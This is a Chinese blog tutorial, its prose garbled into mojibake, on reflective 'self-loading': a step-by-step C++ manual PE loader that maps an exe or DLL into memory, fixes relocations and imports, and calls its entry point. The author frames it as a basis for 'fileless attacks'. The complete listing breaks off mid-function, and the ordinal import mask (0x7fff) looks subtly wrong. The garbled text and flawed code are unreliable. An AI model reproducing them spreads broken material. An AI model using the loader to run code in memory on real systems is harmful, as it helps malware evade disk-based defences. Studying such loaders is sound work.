[{"title":"åå°„å¼åŠ è½½ï¼ˆä¸€ï¼‰ï¼šè‡ªåŠ è½½","path":"/posts/37c4788f.html","content":"å‰è¨€ åŠ è½½å™¨ï¼ˆLoaderï¼‰æ˜¯ä¸€æ®µä¸ºæ‰§è¡Œå‡†å¤‡å…¶ä»–ä»£ç çš„ä»£ç ã€‚åœ¨Windowsç³»ç»Ÿä¸Šï¼Œå½“ç”¨æˆ·åŒå‡»ä¸€ä¸ªexeæ–‡ä»¶æ—¶ï¼Œç³»ç»ŸåŠ è½½å™¨ä¼šå°†è¯¥exeæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œã€‚åŒæ ·ï¼Œå¯¹äºDLLæ–‡ä»¶ï¼Œä¹Ÿæ˜¯é€šè¿‡ç³»ç»ŸAPIå‡½æ•°LoadLibraryAåŠ è½½åˆ°è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ã€‚ç³»ç»ŸåŠ è½½å™¨çš„ä¸»è¦ä½œç”¨æ˜¯å°†ç¨‹åºæˆ–åº“çš„æ•°æ®å‡†å¤‡å¥½ï¼Œä»¥ä¾¿è¯»å–ã€ä¿®æ”¹å’Œ/æˆ–æ‰§è¡Œã€‚ ç„¶è€Œï¼ŒWindowsç³»ç»Ÿä¸Šçš„å†…ç½®åŠ è½½å™¨ï¼ˆbuilt-in loaderï¼‰ä»…æ”¯æŒä»ç£ç›˜ä¸ŠåŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬ä¸ä¾èµ–ç³»ç»Ÿè¿™ä¸ªåŠ è½½å™¨ï¼Œä¹Ÿä¸é€šè¿‡è°ƒç”¨LoadLibraryAå‡½æ•°åŠ è½½DLLæ–‡ä»¶ï¼Œè€Œæ˜¯è‡ªå·±å®ç°å†…å­˜åŠ è½½ï¼Œè¿™æ ·å°±å¯ä»¥æ‘†è„±åªèƒ½ä»ç£ç›˜æ–‡ä»¶åŠ è½½çš„é™åˆ¶ã€‚æ•°æ®å¯ä»¥æ¥è‡ªç½‘ç»œã€å†…å­˜æˆ–è‡ªèº«çš„æŸä¸ªä½ç½®ï¼Œä»è€Œå®ç°â€œæ— æ–‡ä»¶æ”»å‡»â€ã€‚è¿™ç§æŠ€æœ¯å°±æ˜¯åå°„å¼åŠ è½½å™¨ï¼ˆReflective Loaderï¼‰ã€‚åå°„å¼åŠ è½½å™¨å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼š è‡ªåŠ è½½ï¼šç¨‹åºæœ¬èº«åŠ è½½ä¸€ä¸ªPEæ–‡ä»¶åˆ°è‡ªå·±çš„å†…å­˜ç©ºé—´ä¸­å¹¶ä½¿ç”¨å®ƒ è¿›ç¨‹æ³¨å…¥ï¼šå°†PEæ–‡ä»¶æ³¨å…¥åˆ°å¦ä¸€ä¸ªè¿›ç¨‹çš„è¿›ç¨‹ç©ºé—´ä¸­å¹¶è®¾æ³•ä½¿ç”¨ã€‚ åå°„å¼åŠ è½½å™¨ï¼ˆReflective Loaderï¼‰çš„æ ¸å¿ƒæ­¥éª¤åŒ…æ‹¬PEæ–‡ä»¶çš„æ‹‰ä¼¸ã€é‡å®šä½æ•°æ®ä¿®å¤å’ŒIATè¡¨ä¿®æ­£ç­‰ã€‚æœ¬ç¯‡æ–‡ç« å°†è®²è§£å¦‚ä½•å®ç°è‡ªåŠ è½½ï¼Œå³æ‰‹å·¥æ¨¡æ‹ŸPEåŠ è½½å™¨ï¼ˆPE Loaderï¼‰ï¼Œé€šè¿‡ç¨‹åºæœ¬èº«åŠ è½½ä¸€ä¸ªPEæ–‡ä»¶åˆ°è‡ªèº«çš„å†…å­˜ç©ºé—´ä¸­ã€‚åœ¨å®ç°è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‚è€ƒäº†MemoryModuleé¡¹ç›®ï¼Œå¯¹è¯¥é¡¹ç›®çš„å­¦ä¹ ç¬”è®°åœ¨æ–‡ç« åé¢éƒ¨åˆ†ã€‚ ä»£ç å®ç° è¯»å–PEæ–‡ä»¶åˆ°å†…å­˜ä¸­ï¼ˆlpFileBufferï¼Œæœªæ‹‰ä¼¸ï¼‰ æ£€éªŒæ˜¯å¦æ˜¯PEæ–‡ä»¶ æ˜¯å¦æœ‰é‡å®šä½è¡¨ ç”³è¯·å¤§å°ä¸ºImageBaseçš„å†…å­˜ç©ºé—´ å¦‚æœæ²¡é‡å®šä½è¡¨ï¼ŒæŒ‰ImageBaseç”³è¯·ï¼Œç”³è¯·ä¸åˆ°å°±é€€å‡ºç¨‹åº å¦‚æœè¦å†…å­˜åŠ è½½çš„exeæ²¡æœ‰é‡å®šä½è¡¨ï¼Œå¯ä»¥åœ¨ç¼–è¯‘å™¨ä¸­ä¿®æ”¹ManualPELoader.exeè¿è¡Œæ—¶çš„ImageBaseï¼Œç¡®ä¿è¦å†…å­˜åŠ è½½çš„exeèƒ½ç”³è¯·åˆ°å®ƒçš„åŸºå€ å¦‚æœæœ‰é‡å®šä½è¡¨ å…ˆæŒ‰ImageBaseç”³è¯· ç”³è¯·ä¸åˆ°ï¼Œåˆ™å†æ¬¡ç”³è¯·ï¼Œè®©ç³»ç»Ÿå†³å®šåˆ†é…çš„å†…å­˜åœ°å€ å°†PEæ–‡ä»¶æ‹‰ä¼¸åˆ°ç”³è¯·çš„lpImageBufferå†…å­˜ç©ºé—´ä¸­ ä¿®å¤é‡å®šä½æ•°æ® ä¿®æ­£IATè¡¨ æ›´æ–°ImageBaseï¼ˆæŒ‰å®é™…åŠ è½½çš„åŸºå€æ›´æ–°PEä¸­çš„ImageBaseå­—æ®µï¼‰ ä¿®æ”¹å†…å­˜é¡µå±æ€§ æ ¹æ®èŠ‚è¡¨ä¸­èŠ‚å±æ€§å­—æ®µå¾—çŸ¥è¯¥å†…å­˜é¡µå±æ€§ï¼Œå¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œçš„ç»„åˆ è·³è½¬åˆ°å…¥å£ç‚¹ é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å…¥å£å‡½æ•° æ ¹æ®FileHeader.Characteristics &amp; IMAGE_FILE_DLLåˆ¤æ–­å®ƒæ˜¯dllè¿˜æ˜¯exe å¦‚æœæ˜¯dllï¼Œç”¨dllmainå‡½æ•°æŒ‡é’ˆè°ƒç”¨dllmainæ–¹æ³•ï¼Œä¼ é€’DLL_PROCESS_ATTACHå‚æ•° å¦‚æœæ˜¯exeï¼Œä»¥int main(void)è°ƒç”¨mainå‡½æ•° main.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int main()&#123; // Step 1: Read PE file into memory //const char* peFilePath = &quot;D:\\\\005_Codefield\\\\VS2019\\\\ManualPELoader\\\\Debug\\\\TestDll.dll&quot;; //æµ‹è¯•dll ok const char* peFilePath = &quot;D:\\\\005_Codefield\\\\VS2019\\\\ManualPELoader\\\\Debug\\\\TestExe.exe&quot;; //æµ‹è¯•exe ok // //const char* peFilePath = &quot;E:\\\\_Reversing\\\\IDA Pro\\\\IDA_Pro_v7.5_Portable\\\\ida.exe&quot;; //const char* peFilePath = &quot;E:\\\\_Reversing\\\\snapshot_2024-03-19_14-17\\\\release\\\\x32\\\\x32dbg.exe&quot;; LPVOID lpFileBuffer = ReadPEFile(peFilePath); if (!lpFileBuffer) &#123; printf(&quot;[-] Failed to read PE file. &quot;); return -1; &#125; // Step 2: Validate PE file if (!ValidatePEFile(lpFileBuffer)) &#123; printf(&quot;[-] Invalid PE file. &quot;); return -1; &#125; // Step 3: Check for relocation table bool hasRelocationTable = HasRelocationTable(lpFileBuffer); // Step 4: Allocate memory LPVOID lpImageBuffer = AllocateMemoryForPE(lpFileBuffer, hasRelocationTable); if (!lpImageBuffer) &#123; printf(&quot;[-] Memory allocation failed. &quot;); return -1; &#125; // Step 5: Copy PE file to allocated memory CopyPEToMemory(lpFileBuffer, lpImageBuffer); // Step 6: Fix relocations FixRelocations(lpImageBuffer); // Step 7: Repair IAT RepairIAT(lpImageBuffer); // Step 8: Update ImageBase UpdateImageBase(lpImageBuffer); // Step 9: Set memory permissions SetMemoryPermissions(lpImageBuffer); // Step 10: Jump to entry point JumpToEntryPoint(lpImageBuffer); return 0;&#125; 1. è¯»å–PEæ–‡ä»¶åˆ°å†…å­˜ä¸­ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364LPVOID ReadPEFile(const char* filePath)&#123; printf(&quot;[+] Reading PE file: %s &quot;, filePath); // æ‰“å¼€æ–‡ä»¶ HANDLE hFile = CreateFileA( filePath, // æ–‡ä»¶è·¯å¾„ GENERIC_READ, // ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ FILE_SHARE_READ, // å…è®¸å…¶ä»–è¿›ç¨‹è¯»å–æ–‡ä»¶ NULL, // æ— å®‰å…¨å±æ€§ OPEN_EXISTING, // æ‰“å¼€ç°æœ‰æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL,// æ–‡ä»¶ä¸ºæ™®é€šå±æ€§ NULL // æ— æ¨¡æ¿æ–‡ä»¶å¥æŸ„ ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;[-] CreateFile failed. &quot;); return NULL; &#125; // è·å–æ–‡ä»¶å¤§å° DWORD dwFileSize = GetFileSize(hFile, NULL); if (dwFileSize == INVALID_FILE_SIZE) &#123; printf(&quot;[-] GetFileSize failed. &quot;); CloseHandle(hFile); return NULL; &#125; // åˆ†é…å†…å­˜ç©ºé—´ LPVOID lpFileBuffer = VirtualAlloc( NULL, // è®©ç³»ç»Ÿå†³å®šåˆ†é…å†…å­˜çš„åœ°å€ dwFileSize, // åˆ†é…æ–‡ä»¶å¤§å°çš„å†…å­˜ç©ºé—´ MEM_RESERVE | MEM_COMMIT, // ä¿ç•™å¹¶æäº¤å†…å­˜ PAGE_READWRITE // è¯»å†™æƒé™ ); if (!lpFileBuffer) &#123; printf(&quot;[-] VirtualAlloc failed. &quot;); CloseHandle(hFile); return NULL; &#125; // è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ DWORD dwBytesRead; if (!ReadFile( hFile, // æ–‡ä»¶å¥æŸ„ lpFileBuffer, // ç›®æ ‡ç¼“å†²åŒºåœ°å€ dwFileSize, // è¦è¯»å–çš„å­—èŠ‚æ•° &amp;dwBytesRead, // å®é™…è¯»å–çš„å­—èŠ‚æ•° NULL // ä¸ä½¿ç”¨é‡å I/O ) || dwBytesRead != dwFileSize) &#123; printf(&quot;[-] ReadFile failed. &quot;); VirtualFree(lpFileBuffer, 0, MEM_RELEASE); CloseHandle(hFile); return NULL; &#125; // å…³é—­æ–‡ä»¶å¥æŸ„ CloseHandle(hFile); printf(&quot;[*] PE file read successfully. &quot;); return lpFileBuffer;&#125; 2. æ£€éªŒæ˜¯å¦æ˜¯PEæ–‡ä»¶ 123456789101112131415161718bool ValidatePEFile(LPVOID lpFileBuffer) &#123; PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer; if (dosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123; printf(&quot;[-] Invalid DOS signature. &quot;); return false; &#125; PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + dosHeader-&gt;e_lfanew); if (ntHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123; printf(&quot;[-] Invalid NT signature. &quot;); return false; &#125; return true;&#125; 3. æ˜¯å¦æœ‰é‡å®šä½è¡¨ 12345678bool HasRelocationTable(LPVOID lpFileBuffer)&#123; printf(&quot;[+] Checking for relocation table... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + ((PIMAGE_DOS_HEADER)lpFileBuffer)-&gt;e_lfanew); bool hasReloc = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0; printf(&quot;[*] Relocation table %s found. &quot;, hasReloc ? &quot;is&quot; : &quot;is not&quot;); return hasReloc;&#125; 4. ç”³è¯·å†…å­˜ç©ºé—´ ç”³è¯·å¤§å°ä¸ºImageBaseçš„å†…å­˜ å¦‚æœæ²¡é‡å®šä½è¡¨ï¼ŒæŒ‰ImageBaseç”³è¯·ï¼Œç”³è¯·ä¸åˆ°å°±é€€å‡ºç¨‹åº å¦‚æœè¦å†…å­˜åŠ è½½çš„exeæ²¡æœ‰é‡å®šä½è¡¨ï¼Œå¯ä»¥åœ¨ç¼–è¯‘å™¨ä¸­ä¿®æ”¹ManualPELoader.exeè¿è¡Œæ—¶çš„ImageBaseï¼Œç¡®ä¿è¦å†…å­˜åŠ è½½çš„exeèƒ½ç”³è¯·åˆ°å®ƒçš„åŸºå€ å¦‚æœæœ‰é‡å®šä½è¡¨ å…ˆæŒ‰ImageBaseç”³è¯· ç”³è¯·ä¸åˆ°ï¼Œåˆ™å†æ¬¡ç”³è¯·ï¼Œè®©ç³»ç»Ÿå†³å®šåˆ†é…çš„å†…å­˜åœ°å€ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849LPVOID AllocateMemoryForPE(LPVOID lpFileBuffer, bool hasRelocationTable)&#123; auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + ((PIMAGE_DOS_HEADER)lpFileBuffer)-&gt;e_lfanew); LPVOID lpImageBuffer = NULL; if (!hasRelocationTable) &#123; // æ²¡æœ‰é‡å®šä½è¡¨ï¼ŒæŒ‰ImageBaseç”³è¯·å†…å­˜ lpImageBuffer = VirtualAlloc( (LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, // æŒ‡å®šåŸºå€ ntHeaders-&gt;OptionalHeader.SizeOfImage, // æ˜ åƒå¤§å° MEM_COMMIT | MEM_RESERVE, // å†…å­˜åˆ†é…ç±»å‹ PAGE_READWRITE // å†…å­˜ä¿æŠ¤ç±»å‹ ); if (!lpImageBuffer) &#123; printf(&quot;Memory allocation at ImageBase failed. &quot;); return NULL; &#125; &#125; else &#123; // æœ‰é‡å®šä½è¡¨ï¼Œå…ˆå°è¯•æŒ‰ImageBaseç”³è¯·å†…å­˜ lpImageBuffer = VirtualAlloc( (LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, // æŒ‡å®šåŸºå€ ntHeaders-&gt;OptionalHeader.SizeOfImage, // æ˜ åƒå¤§å° MEM_COMMIT | MEM_RESERVE, // å†…å­˜åˆ†é…ç±»å‹ PAGE_READWRITE // å†…å­˜ä¿æŠ¤ç±»å‹ ); if (!lpImageBuffer) &#123; // å¦‚æœæŒ‰ImageBaseç”³è¯·å¤±è´¥ï¼Œå°è¯•ä»»æ„ä½ç½®ç”³è¯·å†…å­˜ lpImageBuffer = VirtualAlloc( NULL, // è®©ç³»ç»Ÿå†³å®šåˆ†é…å†…å­˜çš„åœ°å€ ntHeaders-&gt;OptionalHeader.SizeOfImage, // æ˜ åƒå¤§å° MEM_COMMIT | MEM_RESERVE, // å†…å­˜åˆ†é…ç±»å‹ PAGE_READWRITE // å†…å­˜ä¿æŠ¤ç±»å‹ ); if (!lpImageBuffer) &#123; printf(&quot;Memory allocation failed. &quot;); return NULL; &#125; &#125; &#125; return lpImageBuffer;&#125; 5. å°†PEæ–‡ä»¶æ‹‰ä¼¸åˆ°å†…å­˜ç©ºé—´ä¸­ 123456789101112131415161718void CopyPEToMemory(LPVOID lpFileBuffer, LPVOID lpImageBuffer)&#123; printf(&quot;[+] Copying PE headers and sections to allocated memory... &quot;); auto dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer; auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + dosHeader-&gt;e_lfanew); auto sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)ntHeaders + sizeof(IMAGE_NT_HEADERS)); //SizeOfHeadersç›´æ¥å¯¹æ‹· memcpy(lpImageBuffer, lpFileBuffer, ntHeaders-&gt;OptionalHeader.SizeOfHeaders); //ä»èŠ‚.PointerToRawDataæ‹·èŠ‚.SizeOfRawDataåˆ° -&gt; èŠ‚.VirtualAddress for (int i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) &#123; memcpy((LPVOID)((DWORD)lpImageBuffer + sectionHeader[i].VirtualAddress), (LPVOID)((DWORD)lpFileBuffer + sectionHeader[i].PointerToRawData), sectionHeader[i].SizeOfRawData); &#125; printf(&quot;[*] PE headers and sections copied successfully. &quot;);&#125; 6. ä¿®å¤é‡å®šä½æ•°æ® 123456789101112131415161718192021222324252627282930313233void FixRelocations(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Fixing relocations... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); DWORD dwDelta = (DWORD)lpImageBuffer - ntHeaders-&gt;OptionalHeader.ImageBase; if (dwDelta == 0) &#123; printf(&quot;[*] No relocations needed. &quot;); return; &#125; auto pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lpImageBuffer + ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); while (pReloc-&gt;VirtualAddress) &#123; auto pTypeOffset = (PWORD)((DWORD)pReloc + sizeof(IMAGE_BASE_RELOCATION)); //TypeOffsetæ•°ç»„çš„æŒ‡é’ˆ DWORD dwRelocCount = (pReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); //é¡¹æ•° for (int i = 0; i &lt; dwRelocCount; i++) &#123; DWORD wType = pTypeOffset[i] &gt;&gt; 12; //é«˜4ä½æ˜¯ç±»å‹ DWORD wOffset = pTypeOffset[i] &amp; 0x0FFF; //ä½12ä½æ˜¯åç§» if (wType == IMAGE_REL_BASED_HIGHLOW) //å¯¹äº HIGHLOW ç±»å‹æ˜¯æ•°æ®ï¼Œè¿›è¡Œä¿®æ­£ &#123; //ä¿®æ­£æ•°æ® auto addressToFix = (PDWORD)((DWORD)lpImageBuffer + pReloc-&gt;VirtualAddress + wOffset); *addressToFix += dwDelta; &#125; &#125; pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pReloc + pReloc-&gt;SizeOfBlock); &#125; printf(&quot;[*] Relocations fixed. &quot;);&#125; 7. ä¿®æ­£IATè¡¨ å¯¹äºæ¯ä¸€å¼ å¯¼å…¥è¡¨æ‰€æè¿°çš„dllï¼Œå…ˆç”¨GetModuleHandleAçœ‹æ˜¯å¦å·²åŠ è½½è¿™ä¸ªdllï¼Œå¦‚æœæœªåŠ è½½ï¼Œåˆ™ç”¨LoadLibraryAåŠ è½½è¿™ä¸ªdllã€‚ç„¶åï¼Œæ ¹æ®IATè¡¨è¡¨é¡¹æ˜¯åºå·æ–¹å¼è¿˜æ˜¯åå­—æ–¹å¼å¯¼å…¥ï¼Œç”¨GetProcAddresså¾—åˆ°å¯¼å…¥å‡½æ•°çš„åœ°å€ï¼Œä¿®æ­£IATè¡¨è¡¨é¡¹ å‡è®¾test.exeå¯¼å…¥è¡¨æè¿°äº†éœ€è¦åŠ è½½A.dllï¼ŒB.dllå’ŒC.dllã€‚è€ŒA.dllçš„å¯¼å…¥è¡¨æè¿°äº†éœ€è¦åŠ è½½a1.dllï¼Œa2.dllï¼ŒB.dllçš„å¯¼å…¥è¡¨æè¿°äº†éœ€è¦åŠ è½½a1.dllï¼Œb1.dllã€‚ 12345678Test.exe â”œâ”€â”€ A.dll â”‚ â”œâ”€â”€ a1.dll â”‚ â””â”€â”€ a2.dll â”œâ”€â”€ B.dll â”‚ â”œâ”€â”€ a1.dll â”‚ â””â”€â”€ b1.dll â””â”€â”€ C.dll æˆ‘ä»¬ç”¨ç³»ç»Ÿçš„LoadLibraryAæ¥åŠ è½½A.dllï¼Œç³»ç»Ÿè¿™ä¸ªapiä¼šå¸®æˆ‘ä»¬å¤„ç†å¥½A.dllå®ƒè¿˜éœ€è¦åŠ è½½çš„dllçš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç³»ç»Ÿä¼šå¤„ç†é€’å½’åŠ è½½çš„é—®é¢˜ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455void RepairIAT(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Repairing Import Address Table... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); DWORD importTableRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; if (!importTableRVA) &#123; printf(&quot;[*] No import table. &quot;); return; &#125; auto importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpImageBuffer + importTableRVA); while (importDescriptor-&gt;Name) &#123; const char* dllName = (const char*)((DWORD)lpImageBuffer + importDescriptor-&gt;Name); HMODULE hModule = GetModuleHandleA(dllName); //å¦‚æœè¿™ä¸ªdllå·²åŠ è½½è¿‡ if (hModule == NULL) &#123; hModule = LoadLibraryA(dllName); if (hModule == NULL) &#123; printf(&quot;[-] LoadLibrary failed for %s. &quot;, dllName); importDescriptor++; continue; &#125; &#125; auto thunkINT = (PDWORD)((DWORD)lpImageBuffer + importDescriptor-&gt;OriginalFirstThunk); auto thunkIAT = (PDWORD)((DWORD)lpImageBuffer + importDescriptor-&gt;FirstThunk); while (*thunkINT) &#123; if (IMAGE_SNAP_BY_ORDINAL(*thunkINT)) //æœ€é«˜ä½ä¸º1ï¼Œåºå·æ–¹å¼è¾“å…¥ &#123; *thunkIAT = (DWORD)GetProcAddress(hModule, LPCSTR(*thunkINT &amp; 0x7fff)); if (!*thunkIAT) &#123; printf(&quot;[-] GetProcAddress failed for 0x%08X in %s. &quot;, *thunkINT &amp; 0x7fff, dllName); &#125; &#125; else //æœ€é«˜ä½ä¸º0ï¼Œå‡½æ•°åæ–¹å¼è¾“å…¥ &#123; auto importByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpImageBuffer + *thunkINT); *thunkIAT = (DWORD)GetProcAddress(hModule, importByName-&gt;Name); if (!*thunkIAT) &#123; printf(&quot;[-] GetProcAddress failed for %s in %s. &quot;, importByName-&gt;Name, dllName); &#125; &#125; thunkINT++; thunkIAT++; &#125; importDescriptor++; &#125; printf(&quot;[*] Import Address Table repaired. &quot;);&#125; 8. æ›´æ–°ImageBase å°†ImageBaseæ›´æ–°ä¸ºæ­¤æ—¶PEå®é™…åŠ è½½çš„åŸºå€ 1234567void UpdateImageBase(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Updating ImageBase in PE headers... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); ntHeaders-&gt;OptionalHeader.ImageBase = (DWORD)lpImageBuffer; printf(&quot;[*] ImageBase updated. &quot;);&#125; 9. ä¿®æ”¹å†…å­˜é¡µå±æ€§ å†…å­˜é¡µç”±è¿™ä¸‰ä¸ªæ–¹é¢ä»»æ„ç»„åˆï¼šå¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œã€‚ æ ¹æ®èŠ‚è¡¨.Characteristicså­—æ®µç¡®å®šæ˜¯å¦å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œã€‚å†…å­˜é¡µè‡³å°‘æ˜¯å¯è¯»çš„ï¼Œä»¥ä¸‹æ˜¯å…·ä½“çš„ç»„åˆæƒ…å†µï¼š 123456789101112å¯è¯»â”œâ”€â”€ å¯æ‰§è¡Œâ”‚ â”œâ”€â”€ å¯å†™â”‚ â”‚ â””â”€â”€ å¯è¯»å¯å†™å¯æ‰§è¡Œï¼ˆPAGE_EXECUTE_READWRITEï¼‰â”‚ â””â”€â”€ ä¸å¯å†™â”‚ â””â”€â”€ å¯è¯»å¯æ‰§è¡Œï¼ˆPAGE_EXECUTE_READï¼‰â””â”€â”€ ä¸å¯æ‰§è¡Œ â”œâ”€â”€ å¯å†™ â”‚ â””â”€â”€ å¯è¯»å¯å†™ï¼ˆPAGE_READWRITEï¼‰ â””â”€â”€ ä¸å¯å†™ â””â”€â”€ å¯è¯»ï¼ˆPAGE_READONLYï¼‰ 123456789101112131415161718192021222324void SetMemoryPermissions(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Setting memory permissions... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); auto sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)ntHeaders + sizeof(IMAGE_NT_HEADERS)); for (int i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) &#123; DWORD oldProtect; DWORD newProtect = 0; if (sectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) //å¯æ‰§è¡Œ &#123; newProtect = (sectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ; //è¿˜å¯å†™ï¼šPAGE_EXECUTE_READWRITE &#125; //ä¸å¯å†™ï¼šPAGE_EXECUTE_READå¯æ‰§è¡Œå¯è¯» else //ä¸å¯æ‰§è¡Œ &#123; newProtect = (sectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY; &#125; VirtualProtect((LPVOID)((DWORD)lpImageBuffer + sectionHeader[i].VirtualAddress), sectionHeader[i].Misc.VirtualSize, newProtect, &amp;oldProtect); &#125; printf(&quot;[*] Memory permissions set. &quot;);&#125; 10. è·³è½¬åˆ°å…¥å£ç‚¹ æ ¹æ®FileHeader.Characteristics &amp; IMAGE_FILE_DLLåˆ¤æ–­å®ƒæ˜¯dllè¿˜æ˜¯exe å¦‚æœæ˜¯dllï¼Œç”¨dllmainå‡½æ•°æŒ‡é’ˆè°ƒç”¨dllmainæ–¹æ³•ï¼Œä¼ é€’DLL_PROCESS_ATTACHå‚æ•° å¦‚æœæ˜¯exeï¼Œç”¨mianå‡½æ•°æŒ‡é’ˆæ‰§è¡Œmainæ–¹æ³• 12345678910111213141516171819202122232425void JumpToEntryPoint(LPVOID lpImageBuffer)&#123; auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); DWORD entryPoint = ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint; DWORD imageBase = (DWORD)lpImageBuffer; if (ntHeaders-&gt;FileHeader.Characteristics &amp; IMAGE_FILE_DLL) &#123; // å¦‚æœæ˜¯DLL using DllEntryProc = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID); auto dllMain = (DllEntryProc)(imageBase + entryPoint); printf(&quot;[+] Calling DllMain at: 0x%08X &quot;, imageBase + entryPoint); dllMain((HINSTANCE)lpImageBuffer, DLL_PROCESS_ATTACH, NULL); printf(&quot;[*] DllMain called successfully. &quot;); &#125; else &#123; // å¦‚æœæ˜¯EXE using ExeEntryProc = int(WINAPI*)(); auto exeMain = (ExeEntryProc)(imageBase + entryPoint); printf(&quot;[+] Calling ExeMain at: 0x%08X &quot;, imageBase + entryPoint); exeMain(); printf(&quot;[*] ExeMain called successfully. &quot;); &#125;&#125; å®Œæ•´ä»£ç  å®Œæ•´ä»£ç ManualPELoader123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380#include &lt;windows.h&gt;#include &lt;stdio.h&gt;LPVOID ReadPEFile(const char* filePath);bool ValidatePEFile(LPVOID lpFileBuffer);bool HasRelocationTable(LPVOID lpFileBuffer);LPVOID AllocateMemoryForPE(LPVOID lpFileBuffer, bool hasRelocationTable);void CopyPEToMemory(LPVOID lpFileBuffer, LPVOID lpImageBuffer);void FixRelocations(LPVOID lpImageBuffer);void RepairIAT(LPVOID lpImageBuffer);void UpdateImageBase(LPVOID lpImageBuffer);void SetMemoryPermissions(LPVOID lpImageBuffer);void JumpToEntryPoint(LPVOID lpImageBuffer);int main()&#123; // Step 1: Read PE file into memory //const char* peFilePath = &quot;D:\\\\005_Codefield\\\\VS2019\\\\ManualPELoader\\\\Debug\\\\TestDll.dll&quot;; //æµ‹è¯•dll ok const char* peFilePath = &quot;D:\\\\005_Codefield\\\\VS2019\\\\ManualPELoader\\\\Debug\\\\TestExe.exe&quot;; //æµ‹è¯•exe ok // //const char* peFilePath = &quot;E:\\\\_Reversing\\\\IDA Pro\\\\IDA_Pro_v7.5_Portable\\\\ida.exe&quot;; //const char* peFilePath = &quot;E:\\\\_Reversing\\\\snapshot_2024-03-19_14-17\\\\release\\\\x32\\\\x32dbg.exe&quot;; LPVOID lpFileBuffer = ReadPEFile(peFilePath); if (!lpFileBuffer) &#123; printf(&quot;[-] Failed to read PE file. &quot;); return -1; &#125; // Step 2: Validate PE file if (!ValidatePEFile(lpFileBuffer)) &#123; 